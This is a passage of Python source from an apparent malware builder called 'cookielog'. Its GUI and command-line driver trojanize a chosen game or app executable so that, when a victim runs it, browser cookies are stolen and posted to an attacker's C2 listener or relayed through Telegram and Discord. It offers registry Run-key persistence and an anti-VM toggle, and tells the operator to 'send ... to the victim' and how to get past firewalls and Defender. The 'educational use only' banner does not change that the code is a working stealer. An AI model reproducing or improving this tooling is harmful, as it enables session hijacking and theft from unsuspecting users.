        # --- Telegram row ---
        tg_row1 = tk.Frame(root, bg="#1a1a1a")
        tg_row1.pack(fill="x", padx=50, pady=(2, 0))
        tk.Checkbutton(tg_row1, text="", variable=tg_enable,
                       bg="#1a1a1a", fg="#d4d4d4", selectcolor="#2d2d2d",
                       activebackground="#1a1a1a", activeforeground="#d4d4d4",
                       bd=0, highlightthickness=0).pack(side="left")
        ttk.Label(tg_row1, text="Telegram", width=10,
                  font=("Segoe UI", 9, "bold")).pack(side="left")
        tg_status_lbl = tk.Label(tg_row1, text="", bg="#1a1a1a",
                                 font=("Segoe UI", 8, "bold"))
        tg_status_lbl.pack(side="right")

        tg_row2 = tk.Frame(root, bg="#1a1a1a")
        tg_row2.pack(fill="x", padx=50, pady=(0, 4))
        ttk.Entry(tg_row2, textvariable=tg_var).pack(fill="x", side="left",
                                                      expand=True, padx=(18, 0))

        # --- Discord row ---
        dc_row1 = tk.Frame(root, bg="#1a1a1a")
        dc_row1.pack(fill="x", padx=50, pady=(4, 0))
        tk.Checkbutton(dc_row1, text="", variable=dc_enable,
                       bg="#1a1a1a", fg="#d4d4d4", selectcolor="#2d2d2d",
                       activebackground="#1a1a1a", activeforeground="#d4d4d4",
                       bd=0, highlightthickness=0).pack(side="left")
        ttk.Label(dc_row1, text="Discord", width=10,
                  font=("Segoe UI", 9, "bold")).pack(side="left")
        dc_status_lbl = tk.Label(dc_row1, text="", bg="#1a1a1a",
                                 font=("Segoe UI", 8, "bold"))
        dc_status_lbl.pack(side="right")

        dc_row2 = tk.Frame(root, bg="#1a1a1a")
        dc_row2.pack(fill="x", padx=50, pady=(0, 4))
        ttk.Entry(dc_row2, textvariable=dc_var).pack(fill="x", side="left",
                                                      expand=True, padx=(18, 0))

        # --- Update status labels when checkbox or field changes ---
        def update_tg_status(*_):
            has_key = bool(tg_var.get().strip())
            enabled = tg_enable.get()
            if enabled and has_key:
                tg_status_lbl.config(text="ACTIVE", fg="#5cb85c")
            elif has_key and not enabled:
                tg_status_lbl.config(text="disabled", fg="#888888")
            elif not has_key:
                tg_status_lbl.config(text="no key set", fg="#cc6600")

        def update_dc_status(*_):
            has_key = bool(dc_var.get().strip())
            enabled = dc_enable.get()
            if enabled and has_key:
                dc_status_lbl.config(text="ACTIVE", fg="#5cb85c")
            elif has_key and not enabled:
                dc_status_lbl.config(text="disabled", fg="#888888")
            elif not has_key:
                dc_status_lbl.config(text="no key set", fg="#cc6600")

        tg_var.trace_add("write", update_tg_status)
        dc_var.trace_add("write", update_dc_status)
        tg_enable.trace_add("write", update_tg_status)
        dc_enable.trace_add("write", update_dc_status)
        update_tg_status()
        update_dc_status()

        # --- Save button + feedback ---
        def save_relay():
            _save_to_config()
            save_feedback.config(text="saved to config.json", foreground="#5cb85c")
            root.after(2500, lambda: save_feedback.config(text=""))

        save_row = tk.Frame(root, bg="#1a1a1a")
        save_row.pack(fill="x", padx=50, pady=(8, 0))
        ttk.Button(save_row, text="SAVE RELAY SETTINGS", command=save_relay).pack(side="left")
        save_feedback = tk.Label(save_row, text="", bg="#1a1a1a", fg="#5cb85c",
                                 font=("Segoe UI", 9))
        save_feedback.pack(side="left", padx=(10, 0))

        # --- Persistence checkbox ---
        persist_row = tk.Frame(root, bg="#1a1a1a")
        persist_row.pack(fill="x", padx=50, pady=(8, 0))
        tk.Checkbutton(persist_row, text="Persistence (registry Run key on victim)",
                       variable=persist_var,
                       bg="#1a1a1a", fg="#d4d4d4", selectcolor="#2d2d2d",
                       activebackground="#1a1a1a", activeforeground="#d4d4d4",
                       bd=0, highlightthickness=0,
                       font=("Segoe UI", 9)).pack(side="left")

        # --- Hint ---
        ttk.Label(root,
                  text="Telegram format: bot_token:chat_id   (run tg_chatid.py to get chat_id)",
                  font=("Segoe UI", 8),
                  foreground="#888888").pack(anchor="w", padx=50, pady=(8, 0))
        ttk.Label(root,
                  text="Discord format: https://discord.com/api/webhooks/...",
                  font=("Segoe UI", 8),
                  foreground="#888888").pack(anchor="w", padx=50, pady=(0, 0))

        ttk.Button(root, text="Cancel", command=root.destroy).pack(pady=10)
        root.mainloop()
        return (result["path"], result["mode"], result["run"],
                result.get("telegram"), result.get("discord"), result.get("persist", False),
                result.get("c2_url"), result.get("no_anti_vm", False))
    except Exception as ex:
        log("[!] GUI not available (%s)" % ex)
        return None, None, False, None, None, False, None, False

# ------------------------------------------------------------------ interactive terminal

def print_help():
    """Print all available commands."""
    log("")
    log("=" * 60)
    log("  cookielog -- command list")
    log("=" * 60)
    log("")
    log("  TARGET:")
    log("    infect <path>         Infect a folder or .exe (auto-detect)")
    log("    infect <path> --run   Infect + run locally (test)")
    log("    gui                   Open the GUI picker (folder/exe selection)")
    log("")
    log("  RELAY:")
    log("    telegram <token:chat> Set Telegram relay (saved to config)")
    log("    discord <webhook_url> Set Discord relay (saved to config)")
    log("    relay                 Show relay status (active/off)")
    log("    clear-telegram        Remove saved Telegram token")
    log("    clear-discord         Remove saved Discord webhook")
    log("")
    log("  OPTIONS:")
    log("    port <number>         Set C2 port (default: 9090, saved to config)")
    log("    find-port             Scan 9400-9500 and set the first free port")
    log("    persist on|off        Enable/disable persistence (registry Run key)")
    log("    config                Show current saved configuration")
    log("    tg-chatid <token>     Find your Telegram chat ID")
    log("")
    log("  BUILD / TEST:")
    log("    build                 Compile loader.exe + ckdll.dll (needs MSVC)")
    log("    install               Run install.bat (dependency installer)")
    log("    test-listener         Start listener + send fake cookies (verify it works)")
    log("")
    log("  HELP:")
    log("    help                  Show this command list")
    log("    exit / quit           Exit cookielog")
    log("")
    log("  SHORTCUT: you can also pass CLI args directly, e.g.:")
    log("    python auto.py \"GET UPSTAIRS (64bit)\" --run --persist")
    log("")
    log("=" * 60)
    log("")

def interactive_loop():
    """Interactive terminal mode. Loops until user types exit/quit."""
    log("=" * 60)
    log("  cookielog -- interactive terminal")
    log("  type 'help' for command list, 'exit' to quit")
    log("=" * 60)

    # Pre-load config
    cfg = load_config()
    port = cfg.get("port", 9090)
    telegram = cfg.get("telegram")
    discord = cfg.get("discord")
    persist = cfg.get("persist", False)

    while True:
        try:
            # Show prompt
            tg_hint = " [TG]" if telegram else ""
            dc_hint = " [DC]" if discord else ""
            ps_hint = " [PERSIST]" if persist else ""
            prompt = "\ncookielog%s%s%s> " % (tg_hint, dc_hint, ps_hint)
            line = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            log("\n[*] exiting")
            break

        if not line:
            continue

        parts = line.split(None, 1)
        cmd = parts[0].lower()
        rest = parts[1].strip() if len(parts) > 1 else ""

        # --- commands ---
        if cmd in ("exit", "quit", "q"):
            log("[*] bye")
            break

        elif cmd == "help" or cmd == "?":
            print_help()

        elif cmd == "config":
            show_config()

        elif cmd == "tg-chatid":
            if not rest:
                log("usage: tg-chatid <bot_token>")
                log("example: tg-chatid 8975447629:AAFzK9wam_2jfoZ...")
            else:
                log("[*] looking up chat ID...")
                chat_id = tg_lookup_chatid(rest)
                if chat_id:
                    full = "%s:%s" % (rest, chat_id)
                    telegram = full
                    cfg["telegram"] = full
                    save_config(cfg)
                    log("[+] Chat ID: %s" % chat_id)
                    log("[+] Saved to config. Telegram relay is now active.")
                else:
                    log("[-] No messages found. Send a message to your bot first, then retry.")

        elif cmd == "telegram":
            if not rest:
                log("usage: telegram <bot_token:chat_id>")
                log("tip: run 'tg-chatid <bot_token>' to find your chat ID")
            else:
                telegram = rest
                cfg["telegram"] = rest
                save_config(cfg)
                log("[+] Telegram relay set and saved to config")

        elif cmd == "discord":
            if not rest:
                log("usage: discord <webhook_url>")
            else:
                discord = rest
                cfg["discord"] = rest
                save_config(cfg)
                log("[+] Discord relay set and saved to config")

        elif cmd == "clear-telegram":
            telegram = None
            cfg.pop("telegram", None)
            save_config(cfg)
            log("[+] Telegram relay cleared")

        elif cmd == "clear-discord":
            discord = None
            cfg.pop("discord", None)
            save_config(cfg)
            log("[+] Discord relay cleared")

        elif cmd == "port":
            if not rest or not rest.isdigit():
                log("usage: port <number> (current: %d)" % port)
            else:
                port = int(rest)
                cfg["port"] = port
                save_config(cfg)
                log("[+] Port set to %d (saved to config)" % port)

        elif cmd == "find-port":
            log("[*] scanning for a free port (9400-9500, preferred: %d)..." % port)
            best = find_best_port(start=9400, end=9500, preferred=port)
            if best is not None:
                port = best
                cfg["port"] = port
                save_config(cfg)
                log("[+] Best free port: %d (saved to config)" % port)
            else:
                log("[-] no free port found in range 9400-9500")

        elif cmd == "persist":
            if rest.lower() == "on":
                persist = True; cfg["persist"] = True; save_config(cfg)
                log("[+] Persistence: enabled (saved)")
            elif rest.lower() == "off":
                persist = False; cfg["persist"] = False; save_config(cfg)
                log("[+] Persistence: disabled (saved)")
            else:
                log("usage: persist on|off (current: %s)" % ("on" if persist else "off"))

        elif cmd == "build":
            log("[*] running build.bat...")
            ret = subprocess.call(["cmd", "/c", BUILD], cwd=HERE)
            if ret == 0:
                log("[+] build OK")
            else:
                log("[-] build failed (exit %d)" % ret)

        elif cmd == "install":
            log("[*] running install.bat...")
            subprocess.call(["cmd", "/c", "install.bat"], cwd=HERE)

        elif cmd == "test-listener":
            # Start listener on a test port and send fake cookies
            test_port = port
            log("[*] starting listener on port %d for test..." % test_port)
            listener = start_listener(test_port, telegram, discord)
            if not listener:
                log("[-] could not start listener")
                continue
            time.sleep(1)
            try:
                fake = '[{"domain":"test.com","name":"test_cookie","value":"abc123","path":"/","expirationDate":0,"sameSite":"None","secure":false,"httpOnly":false,"hostOnly":true,"session":true}]'
                import urllib.request as ur
                req = ur.Request("http://127.0.0.1:%d/" % test_port,
                                 data=fake.encode(),
                                 headers={"Content-Type": "application/json"})
                resp = ur.urlopen(req, timeout=5)
                log("[+] listener test: HTTP %d %s" % (resp.status, resp.read().decode()))
                # Check if loot was written
                jp = os.path.join(LOOT, "cookies.json")
                if os.path.exists(jp) and os.path.getsize(jp) > 10:
                    log("[+] loot/cookies.json written (%d bytes)" % os.path.getsize(jp))
                    sp = os.path.join(LOOT, "session_cookies.json")
                    if os.path.exists(sp):
                        log("[+] loot/session_cookies.json written (%d bytes)" % os.path.getsize(sp))
                    log("[+] listener is working!")
                else:
                    log("[-] listener responded but no loot file written")
            except Exception as ex:
                log("[-] listener test failed: %s" % ex)
            listener.terminate()

        elif cmd == "relay":
            # Show relay status
            log("  Telegram: %s" % ("active" if telegram else "off"))
            log("  Discord:  %s" % ("active" if discord else "off"))
            if telegram or discord:
                log("  saved keys in config.json: yes")
            else:
                saved = load_config()
                if saved.get("telegram") or saved.get("discord"):
                    log("  saved keys in config.json: yes (but not active for this session)")
                else:
                    log("  saved keys in config.json: no")
            log("")
            log("  to set:    telegram <token:chat_id>  /  discord <webhook_url>")
            log("  to disable: clear-telegram           /  clear-discord")
            log("  (clear removes from config.json; to re-enable, re-enter the key)")

        elif cmd == "gui":
            # Launch GUI picker, then run the full flow
            host_path, mode, gui_run, gui_tg, gui_dc, gui_persist = pick_gui()
            if not host_path:
                log("[-] nothing selected")
                continue
            # GUI values are authoritative (None = relay disabled by checkbox)
            telegram = gui_tg
            discord = gui_dc
            persist = gui_persist
            run_one(host_path, mode, gui_run, port, telegram, discord, persist)

        elif cmd == "infect":
            if not rest:
                log("usage: infect <path> [--run] [--persist]")
                log("  path can be a folder or a .exe")
                log("  --run: run locally after infecting (test)")
                continue
            # Parse the rest
            sub = rest.split()
            host_path = ""
            run_flag = False
            persist_flag = persist  # inherit current
            j = 0
            while j < len(sub):
                if sub[j] == "--run":
                    run_flag = True
                elif sub[j] == "--persist":
                    persist_flag = True
                else:
                    if host_path:
                        host_path += " " + sub[j]
                    else:
                        host_path = sub[j]
                j += 1

            if not os.path.exists(host_path):
                log("[-] path does not exist: %s" % host_path)
                continue

            if os.path.isdir(host_path):
                mode = "folder"
            else:
                mode = "file"

            if persist_flag and not persist:
                persist = True
                cfg["persist"] = True
                save_config(cfg)

            run_one(host_path, mode, run_flag, port, telegram, discord, persist_flag)

        else:
            log("invalid command: '%s' -- type 'help' for command list" % cmd)


def run_one(host_path, mode, run_local, port, telegram, discord, persist, no_anti_vm=False, c2_override=None):
    """Execute the full infect flow for a single target."""
    log("=" * 60)
    log("  cookielog -- infecting %s" % os.path.basename(host_path))
    log("=" * 60)

    # 1. ensure binaries
    log("\n[1/5] checking binaries...")
    if not ensure_build():
        log("[-] cannot continue without binaries")
        return

    # 2. detect IP
    log("\n[2/5] detecting attacker IP...")
    if c2_override:
        c2_url = c2_override
        ip = c2_override
        log("[+] C2 URL (manual): %s" % c2_url)
    else:
        ip = detect_ip()
        c2_url = "http://%s:%d/" % (ip, port)
        log("[+] C2 URL: %s" % c2_url)
    if telegram:
        log("[+] Telegram relay: enabled")
    if discord:
        log("[+] Discord relay: enabled")
    if persist:
        log("[+] Persistence: enabled (registry Run key)")
    if no_anti_vm:
        log("[+] Anti-VM: DISABLED (--no-anti-vm)")
    if not c2_override and ip != "127.0.0.1" and _is_private_ip(ip):
        log("[!] WARNING: IP %s is LAN/private -- external machines can't reach it." % ip)
        log("[!]   Use --c2 http://YOUR_PUBLIC_IP:%d/ for external targets." % port)
    if run_local:
        c2_url = "http://127.0.0.1:%d/" % port
        log("[+] C2 URL (local test): %s" % c2_url)

    # 3. start listener
    log("\n[3/5] starting listener...")
    listener = start_listener(port, telegram, discord)
    if not listener:
        log("[-] could not start listener")
        return

    # 4. infect
    log("\n[4/5] infecting...")
    try:
        if mode == "folder":
            out_path, orig_exe = build_infected_folder(host_path, c2_url, persist, no_anti_vm)
            if not out_path:
                listener.terminate()
                return
            folder_name = os.path.basename(os.path.abspath(host_path))
            log("\n" + "=" * 60)
            if run_local:
                log("  LOCAL TEST -- running from ifec/folds/%s/" % folder_name)
            else:
                log("  READY -- send ifec/folds/%s/ to the victim" % folder_name)
            log("=" * 60)
        else:
            out_path = build_infected_standalone(host_path, c2_url, persist, no_anti_vm)
            bname = os.path.basename(out_path)
            log("[+] infected: ifec/apps/%s" % bname)
            log("[+] C2 URL embedded: %s" % c2_url)
    except Exception as ex:
        log("[-] infection failed: %s" % ex)
        listener.terminate()
        return

    # 5. run locally or wait
    if run_local:
        try:
            if mode == "folder":
                run_infected_locally(None, out_path, is_folder=True)
            else:
                run_infected_locally(host_path, out_path, is_folder=False)
        except Exception as ex:
            log("[!] local run failed: %s" % ex)
            if mode == "file":
                backup = host_path + ".orig"
                if os.path.exists(backup):
                    shutil.copy2(backup, host_path)
                    os.remove(backup)
                    log("[+] original .exe restored after error")

    # 6. wait for cookies
    try:
        wait_for_cookies(timeout=300)
    except KeyboardInterrupt:
        pass
    if listener.poll() is None:
        log("[*] listener still running on port %d -- leave it up for late victims" % port)
    log("\n[*] done. cookies in loot/all_cookies.json + loot/session_cookies.json")

# ------------------------------------------------------------------ main

def main():
    # If no arguments, ask: GUI or terminal?
    if len(sys.argv) == 1:
        log("=" * 60)
        log("  cookielog -- educational security research tool")
        log("  EDUCATIONAL USE ONLY -- FOR SECURITY RESEARCH / TRAINING")
        log("=" * 60)
        log("")
        log("  [1] GUI mode      (graphical interface -- pick folder/exe)")
        log("  [2] Terminal mode (interactive command line)")
        log("  [3] Quick infect   (skip menu, use CLI args)")
        log("")
        try:
            choice = input("  choose [1/2/3] (default 1): ").strip()
        except (EOFError, KeyboardInterrupt):
            return 0

        if choice == "2" or choice.lower() == "terminal":
            interactive_loop()
            return 0
        elif choice == "3":
            log("[*] pass args: python auto.py <path> [--run] [--persist] [--telegram ...] [--discord ...]")
            return 0
        # default: GUI mode (fall through)

    port = 9090
    host_arg = None
    run_local = False
    telegram = None
    discord = None
    persist = False
    show_cfg = False
    clear_tg = False
    clear_dc = False
    c2_override = None
    no_anti_vm = False
    find_port = False

    # parse args
    args = sys.argv[1:]
    i = 0
    while i < len(args):
        a = args[i]
        if a == "--port" and i + 1 < len(args):
            port = int(args[i + 1]); i += 2
        elif a == "--run":
            run_local = True; i += 1
        elif a == "--cli":
            i += 1
        elif a == "--telegram" and i + 1 < len(args):
            telegram = args[i + 1]; i += 2
        elif a == "--discord" and i + 1 < len(args):
            discord = args[i + 1]; i += 2
        elif a == "--persist":
            persist = True; i += 1
        elif a == "--c2" and i + 1 < len(args):
            c2_override = args[i + 1]; i += 2
        elif a == "--no-anti-vm":
            no_anti_vm = True; i += 1
        elif a == "--find-port":
            find_port = True; i += 1
        elif a == "--config":
            show_cfg = True; i += 1
        elif a == "--clear-telegram":
            clear_tg = True; i += 1
        elif a == "--clear-discord":
            clear_dc = True; i += 1
        elif not a.startswith("--"):
            # join remaining non-flag args as the host path (handles spaces)
            parts = []
            while i < len(args) and not args[i].startswith("--"):
                parts.append(args[i]); i += 1
            host_arg = " ".join(parts)
        else:
            i += 1

    # --config: show saved settings and exit
    if show_cfg:
        show_config()
        return 0

    # --clear-telegram / --clear-discord: remove from config and exit
    if clear_tg or clear_dc:
        cfg = load_config()
        if clear_tg:
            cfg.pop("telegram", None)
            log("[+] Telegram cleared from config")
        if clear_dc:
            cfg.pop("discord", None)
            log("[+] Discord cleared from config")
        save_config(cfg)
        return 0

    # Load saved config for values not passed via CLI
    cfg = load_config()
    if telegram is None and cfg.get("telegram"):
        telegram = cfg["telegram"]
        log("[*] Telegram: loaded from config.json")
    if discord is None and cfg.get("discord"):
        discord = cfg["discord"]
        log("[*] Discord: loaded from config.json")
    if not persist and cfg.get("persist"):
        persist = True
        log("[*] Persist: loaded from config.json")
    if port == 9090 and cfg.get("port"):
        port = cfg["port"]

    # --find-port: scan for a free port and use it
    if find_port:
        log("[*] scanning for a free port (9400-9500)...")
        best = find_best_port(start=9400, end=9500, preferred=port)
        if best is not None:
            if best != port:
                log("[+] found free port: %d (was %d)" % (best, port))
            else:
                log("[+] port %d is free" % best)
            port = best
        else:
            log("[-] no free port found in range 9400-9500, using %d" % port)

    # Save new values to config if provided via CLI
    cfg_new = load_config()
    changed = False
    if telegram and telegram != cfg_new.get("telegram"):
        cfg_new["telegram"] = telegram
        changed = True
    if discord and discord != cfg_new.get("discord"):
        cfg_new["discord"] = discord
        changed = True
    if persist != bool(cfg_new.get("persist")):
        cfg_new["persist"] = persist
        changed = True
    if port != cfg_new.get("port"):
        cfg_new["port"] = port
        changed = True
    if changed:
        save_config(cfg_new)
        log("[+] config.json updated")

    log("=" * 60)
    log("  cookielog -- automatic payload setup")
    log("=" * 60)

    # 1. ensure binaries
    log("\n[1/5] checking binaries...")
    if not ensure_build():
        log("[-] cannot continue without binaries")
        return 1

    # 2. detect IP + build C2 URL
    log("\n[2/5] detecting attacker IP...")
    ip = None
    if c2_override:
        c2_url = c2_override
        log("[+] C2 URL (manual): %s" % c2_url)
    else:
        ip = detect_ip()
        c2_url = "http://%s:%d/" % (ip, port)
        log("[+] C2 URL: %s" % c2_url)
    if telegram:
        log("[+] Telegram relay: enabled")
    if discord:
        log("[+] Discord relay: enabled")
    if persist:
        log("[+] Persistence: enabled (registry Run key)")
    if no_anti_vm:
        log("[+] Anti-VM: DISABLED (--no-anti-vm) — payload will run in VMs")
    if ip and ip == "127.0.0.1":
        log("[!] could not detect local IP -- using 127.0.0.1 (localhost only)")
    elif ip and not c2_override and _is_private_ip(ip):
        log("[!] WARNING: detected IP %s is a LAN/private address." % ip)
        log("[!]   Machines outside your LAN CANNOT reach this IP.")
        log("[!]   For external targets, use:")
        log("[!]     1. Port-forward port %d on your router to this machine" % port)
        log("[!]     2. Find your public IP (e.g. https://api.ipify.org)")
        log("[!]     3. Re-run with: --c2 http://YOUR_PUBLIC_IP:%d/" % port)
        log("[!]   Or use the Telegram/Discord relay if the C2 port is firewalled.")
    if run_local:
        log("[*] mode: LOCAL TEST (will run infected exe on this machine)")
        c2_url = "http://127.0.0.1:%d/" % port
        log("[+] C2 URL (local test): %s" % c2_url)

    # 3. get target (file or folder)
    log("\n[3/5] selecting target...")
    if host_arg:
        host_path = host_arg
        if os.path.isdir(host_path):
            mode = "folder"
        elif os.path.isfile(host_path):
            mode = "file"
        else:
            log("[-] path does not exist: %s" % host_path)
            return 1
        log("[+] target (%s): %s" % (mode, host_path))
    else:
        host_path, mode, gui_run, gui_tg, gui_dc, gui_persist, gui_c2, gui_avm = pick_gui()
        if not host_path:
            log("[-] nothing selected")
            return 1
        if gui_run:
            run_local = True
            c2_url = "http://127.0.0.1:%d/" % port
        elif gui_c2:
            # Use the C2 URL from the GUI (may be public IP)
            c2_url = gui_c2
            c2_override = gui_c2  # prevent detect_ip from overwriting
        if gui_avm:
            no_anti_vm = True
        # GUI values are authoritative — if the user unchecked a relay
        # checkbox, gui_tg/gui_dc will be None, and we must NOT fall back
        # to the config value. The GUI already saved keys to config; the
        # checkbox controls whether the relay is USED for this run.
        telegram = gui_tg   # None if unchecked or empty
        discord = gui_dc    # None if unchecked or empty
        persist = gui_persist
        log("[+] target (%s): %s" % (mode, host_path))
        log("[+] C2 URL: %s" % c2_url)
        if no_anti_vm:
            log("[+] Anti-VM: DISABLED (from GUI)")
        if run_local:
            log("[+] mode: LOCAL TEST (run locally)")
        if telegram:
            log("[+] Telegram relay: active (from GUI)")
        elif cfg.get("telegram"):
            log("[*] Telegram relay: disabled (checkbox off, key saved in config)")
        if discord:
            log("[+] Discord relay: active (from GUI)")
        elif cfg.get("discord"):
            log("[*] Discord relay: disabled (checkbox off, key saved in config)")

    # 4. start listener
    log("\n[4/5] starting listener...")
    listener = start_listener(port, telegram, discord)
    if not listener:
        log("[-] could not start listener")
        return 1

    # 5. infect
    log("\n[5/5] infecting...")
    try:
        if mode == "folder":
            out_path, orig_exe = build_infected_folder(host_path, c2_url, persist, no_anti_vm)
            if not out_path:
                listener.terminate()
                return 1
            folder_name = os.path.basename(os.path.abspath(host_path))
            log("\n" + "=" * 60)
            if run_local:
                log("  LOCAL TEST -- running from ifec/folds/%s/" % folder_name)
            else:
                log("  READY -- send ifec/folds/%s/ to the victim" % folder_name)
                log("  when the victim runs it:")
                log("    - the original app/game opens normally")
                log("    - payload extracts cookies from the VICTIM's machine")
                log("    - cookies are sent via HTTP POST to %s" % c2_url)
                log("  cookies will appear in loot/all_cookies.json")
                log("")
                log("  TROUBLESHOOTING (if no data arrives):")
                log("    1. Is this listener reachable from the victim?")
                log("       -> the victim must be able to reach %s" % c2_url)
                log("    2. If C2 URL is a LAN IP (192.168.x.x), external machines")
                log("       CANNOT reach it. Use --c2 http://YOUR_PUBLIC_IP:PORT/")
                log("    3. Is the port forwarded on your router? (port %d -> this machine)" % port)
                log("    4. Is Windows Defender on the victim? It may quarantine the exe.")
                log("    5. Is the victim a VM? Use --no-anti-vm to skip VM detection.")
                log("    6. Use Telegram/Discord relay as fallback if port is firewalled.")
            log("=" * 60)
        else:
            out_path = build_infected_standalone(host_path, c2_url, persist, no_anti_vm)
            bname = os.path.basename(out_path)
            log("[+] infected: ifec/apps/%s" % bname)
            log("    loader: %d KB + host: %d KB = %d KB" % (
                os.path.getsize(LOADER) // 1024,
                os.path.getsize(host_path) // 1024,
                os.path.getsize(out_path) // 1024))
            log("[+] C2 URL embedded: %s" % c2_url)
            log("\n" + "=" * 60)
            if run_local:
                log("  LOCAL TEST -- running infected exe on this machine")
            else:
                log("  READY -- send ifec/apps/%s to the victim" % bname)
                log("  when the victim runs it:")
                log("    - the original app/game opens normally")
                log("    - payload extracts cookies from the VICTIM's machine")
                log("    - cookies are sent via HTTP POST to %s" % c2_url)
                log("  cookies will appear in loot/all_cookies.json")
                log("")
                log("  TROUBLESHOOTING (if no data arrives):")
                log("    1. Is this listener reachable from the victim?")
                log("       -> the victim must be able to reach %s" % c2_url)
                log("    2. If C2 URL is a LAN IP (192.168.x.x), external machines")
                log("       CANNOT reach it. Use --c2 http://YOUR_PUBLIC_IP:PORT/")
                log("    3. Is the port forwarded on your router? (port %d -> this machine)" % port)
                log("    4. Is Windows Defender on the victim? It may quarantine the exe.")
                log("    5. Is the victim a VM? Use --no-anti-vm to skip VM detection.")
                log("    6. Use Telegram/Discord relay as fallback if port is firewalled.")
            log("=" * 60)
    except Exception as ex:
        log("[-] infection failed: %s" % ex)
        listener.terminate()
        return 1

    # 6. run locally or wait for cookies
    if run_local:
        try:
            if mode == "folder":
                run_infected_locally(None, out_path, is_folder=True)
            else:
                run_infected_locally(host_path, out_path, is_folder=False)
        except Exception as ex:
            log("[!] local run failed: %s" % ex)
            if mode == "file":
                backup = host_path + ".orig"
                if os.path.exists(backup):
                    shutil.copy2(backup, host_path)
                    os.remove(backup)
                    log("[+] original .exe restored after error")

    # 7. wait for cookies
    try:
        wait_for_cookies(timeout=300)
    except KeyboardInterrupt:
        log("\n[*] interrupted by user")
    # keep the listener alive: victims often run the exe minutes or hours later,
    # terminating it here silently dropped every late delivery
    if listener.poll() is None:
        log("[*] listener still running on port %d -- leave it up for late victims (close its window to stop)" % port)

    return 0

if __name__ == "__main__":
    sys.exit(main())
